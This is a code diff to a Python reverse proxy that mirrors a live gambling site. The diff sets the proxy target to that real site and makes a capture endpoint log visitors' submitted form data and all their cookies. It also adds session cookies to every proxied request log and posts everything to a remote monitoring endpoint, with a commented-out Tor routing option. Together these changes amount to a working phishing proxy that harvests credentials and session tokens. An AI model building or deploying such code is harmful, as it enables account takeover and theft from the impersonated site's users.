@@ -12,20 +12,22 @@ from bs4 import BeautifulSoup
 from fastapi import FastAPI, Request, Response, HTTPException, WebSocket, WebSocketDisconnect
 from fastapi.responses import StreamingResponse, JSONResponse, HTMLResponse
 from urllib.parse import urljoin, urlparse
-
+from httpx_socks import AsyncProxyTransport
 import os
 from dotenv import load_dotenv
 
 load_dotenv()
 proxy_setting = os.getenv("PROXY_URL")
-
 MONITORING_URL = os.getenv("MONITORING_URL")
 MONITORING_API_KEY = os.getenv("MONITORING_API_KEY")
+print(MONITORING_API_KEY)
 
 # =========================================================
 # [CONFIGURATION & CONSTANTS]
 # =========================================================
-TARGET_BASE = "https://whatismyipaddress.com/"
+
+
+TARGET_BASE = "https://www.veravegas.com/" 
 parsed_target = urlparse(TARGET_BASE)
 TARGET_DOMAIN = parsed_target.netloc
 
@@ -91,6 +93,16 @@ def rewrite_json(data: Any, target_domain: str, proxy_domain: str) -> Any:
 # =========================================================
 # [LOGGER MODULE] 
 # =========================================================
+
+def clean_payload(data: dict) -> dict:
+    """Remove null, empty string, or empty dict values recursively."""
+    if isinstance(data, dict):
+        return {k: clean_payload(v) for k, v in data.items() if v not in (None, "", {})}
+    elif isinstance(data, list):
+        return [clean_payload(x) for x in data if x not in (None, "", {})]
+    return data
+
+
 class ProxyLogger:
     def __init__(self, max_logs=1000):
         self.logs: List[dict] = []
@@ -303,17 +315,36 @@ FORM_OBSERVER_SCRIPT = """
 # =========================================================
 # [CAPTURE ENDPOINT]
 # =========================================================
+
+    # await proxy_logger.log_event(
+    #     event_type=f"capture_{capture_type}", 
+    #     session_id=client_session_id, 
+    #     method=data.get("method", "POST"), 
+    #     path=data.get("url", "/capture"), 
+    #     data=data.get("payload", {})
+    # )
+
 @app.post("/capture")
 async def capture_form_data(request: Request, data: dict):
     client_session_id = request.cookies.get("proxy_session_id", "N/A")
     capture_type = data.get("type", "unknown")
-    
+    payload = data.get("payload", {})
+
+    # Clean payload before logging
+    cleaned_payload = clean_payload(payload)
+
+    log_data = {
+        "captured_type": capture_type,
+        "request_payload": payload,
+        "client_cookies": dict(request.cookies)
+    }
+
     await proxy_logger.log_event(
-        event_type=f"capture_{capture_type}", 
-        session_id=client_session_id, 
-        method=data.get("method", "POST"), 
-        path=data.get("url", "/capture"), 
-        data=data.get("payload", {})
+        f"capture_{capture_type}",
+        session_id=client_session_id,
+        method=data.get("method", "POST"),
+        path=data.get("url", "/capture"),
+        data=log_data
     )
     return JSONResponse(content={"status": "captured"}, status_code=200)
 
@@ -393,12 +424,14 @@ async def send_to_monitoring(event: dict):
         "data": event.get("data", {}) 
     }
 
+    # transport = AsyncProxyTransport.from_url("socks5://127.0.0.1:9050")
+    # transport=transport,
     try:
         async with httpx.AsyncClient(timeout=5.0) as client:
             await client.post(
-                f"{MONITORING_URL.rstrip('/')}/ingest", # Pointing to /ingest
+                f"{MONITORING_URL.rstrip('/')}/ingest",
                 json=payload,
-                headers={"X-API-Key": MONITORING_API_KEY}
+                headers={"X-API-Key": MONITORING_API_KEY},
             )
     except Exception as e:
         print("MONITOR ERROR:", e)
@@ -460,8 +493,17 @@ async def proxy(request: Request, path: str):
         )
         resp = await client.send(proxy_req, stream=True)
         
-        if not log_data: 
-             await proxy_logger.log_event("proxy_request", session_id, request.method, f"/{path}", status=resp.status_code)
+        if not log_data:
+            log_data = {"request_cookies": merged_cookies}
+            log_data = clean_payload(log_data)  # <-- filter nulls
+            await proxy_logger.log_event(
+                "proxy_request", 
+                session_id, 
+                request.method, 
+                f"/{path}", 
+                status=resp.status_code, 
+                data=log_data
+            )
 
     except httpx.RequestError as exc:
         await proxy_logger.log_event("proxy_error", session_id, request.method, f"/{path}", data={"error": str(exc)})
